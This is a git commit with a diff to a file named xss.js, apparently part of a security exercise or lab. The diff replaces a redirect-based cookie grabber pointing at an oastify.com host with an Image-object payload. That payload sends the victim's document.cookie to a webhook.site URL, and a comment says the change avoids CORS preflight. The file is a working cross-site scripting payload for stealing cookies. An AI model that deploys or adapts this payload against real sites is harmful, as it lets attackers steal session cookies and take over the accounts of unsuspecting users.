f8ac0e53d081d36001752cd759c4cf6d4570876b
Mathis <mathis.onillon@epitech.eu>
2025-05-15 22:24:01 +0200

    feat: update XSS script to use Image object for cookie retrieval to avoid CORS preflight

--- xss.js
+++ xss.js
@@ -1,1 +1,3 @@
-document.location='http://7go0aqfh0duyb0j74s00hwdtuk0bo4ct.oastify.com/XSS/grabber.php?c='+document.cookie
+// Using image to avoid CORS preflight
+const img = new Image();
+img.src = 'https://webhook.site/53a7f2a0-98d5-4866-b261-115bc6d29972/?c=' + encodeURIComponent(document.cookie);
